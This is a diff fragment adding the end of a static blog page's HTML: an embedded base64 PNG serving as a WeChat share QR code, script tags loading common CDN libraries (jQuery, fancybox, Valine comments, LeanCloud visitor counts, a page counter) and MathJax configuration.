+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACxElEQVR42u3a0W7bQAwEwP7/T6dAnwoklnfJuzQFRk+GIks3CnCkSf76FR8ff47PZ/4+//nz52vauz3f59iBh4eHN1r68+1efU4WlwOS8/ma8fDw8G7znoPB86b8DD4Vu5L14OHh4f00XhISnnPa/JrnRBwPDw/vf+Hl38pJ+894eHh4/4qXFCOS0kCSas9e6/VaCx4eHt7RasCpTfxGMDjc38PDw8NbdNWTbffsAMHZ1eLh4eHd4OVl1rbplQeVfGQhL/jWVWQ8PDy8BS8vQLTU2dLb0YQvrsfDw8M7yku+1ra7Nil4+2relJLx8PDwLvD2m3JbeJ012/aDX3h4eHineM/ufGQqGSZoAfn9o98KeHh4eId4m0Q22dZnpY28DVaMc+Hh4eEd4rWBYT9k0I4X5EHli7/i4eHhXeC1Jdp2Q5+l3ZvQgoeHh3eb127fbdusLf6eKgEXbxcPDw+v5OVF0v3iZuNTB1JqPDw8vKO8dhNvyxDFUFSc3BflDDw8PLwLvE3yugkneQJdRLbnzh4eHh7eBd6VPD0m7YcM3kQ/PDw8vEO8fPvON/H2pWxe1psn4uHh4V3jtQ+YjQW0Rdv8bm8CAx4eHt5R3r71NUua61JsEE5eXoOHh4d3jZd8bVbqnb2Itmzx8lXi4eHhXeDlpYFZ+puXJFpk8Sw8PDy8b+HlaXRyfR5akju0z8LDw8M7y5uFhHxzn5V6NyWMl7UWPDw8vAu8Tfo7W8S+aFsk03h4eHhr3kd5tI+c4fNRsDf/Hjw8PLwLvNkSZ42uWeOqbYPN/gF4eHh4Le/soNWpAkc7dvDmFwMeHh7eBd6myZSnyJvybl6GKKrUeHh4eD+MN9vcN8HgWwMDHh4e3mjRmxS5LTHMzuPh4eHd4+WF1zyNThbUvqx6BAEPDw/vAm/fAGuHsdr2fxK6hp09PDw8vI73G2OfkpdJohSQAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script type="text/javascript" src="/js/plugins/valine.js?v=1.4.2"></script>
+    
+    
+
+
+
+<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.4.2"></script>
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+</body>
+</html>
